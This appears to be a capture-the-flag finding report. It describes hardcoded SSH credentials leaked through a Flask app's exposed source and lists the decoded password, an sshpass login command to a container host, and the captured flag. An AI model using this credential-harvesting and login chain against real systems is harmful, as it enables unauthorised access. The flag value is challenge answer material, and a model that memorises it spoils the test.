findings.title: Hardcoded SSH Credentials in Exposed Source Code — CTF Flag Extracted
findings.description: The Flask application at /source exposes its own source code. The source contains hardcoded SSH credentials for user 'pedro' (password base64-encoded as 'QUhlYXZ5U2FuZGJhZw==' decoding to 'AHeavySandbag!'). These credentials were used to authenticate to the container's SSH service on port 53808, granting access to /home/pedro/FLAG.txt.
findings.evidence:
1. GET /source revealed: password = base64.b64decode(b'QUhlYXZ5U2FuZGJhZw==').decode('utf-8') + '!' = 'AHeavySandbag!'
2. Port scan found port 53808 (OpenSSH 9.2p1 Debian — container SSH)
3. SSH login: sshpass -p 'AHeavySandbag!' ssh -p 53808 pedro@172.17.0.1
4. Flag: flag{8967fc4b-578f-4b9f-952e-26eb7fb2e909}
